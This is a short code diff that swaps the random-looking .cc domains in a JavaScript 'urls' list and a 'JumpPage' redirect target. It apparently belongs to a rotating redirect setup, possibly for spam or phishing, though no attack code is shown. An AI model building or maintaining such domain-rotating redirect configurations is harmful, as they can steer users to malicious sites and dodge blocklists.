@@ -37,12 +37,12 @@ var emails = [
 ];
 
 var urls=[
-	'dchstmro.cc/', 
-	'dchstmro.cc/', 
+	'ritewaxm.cc/', 
+	'ritewaxm.cc/', 
     'dchstmro.cc/',
 ];                                                                                                                  
 
-var JumpPage="https://rteehztv.cc";
+var JumpPage="https://omyewnlyv.cc";
 
 var newestUrls = [];
 
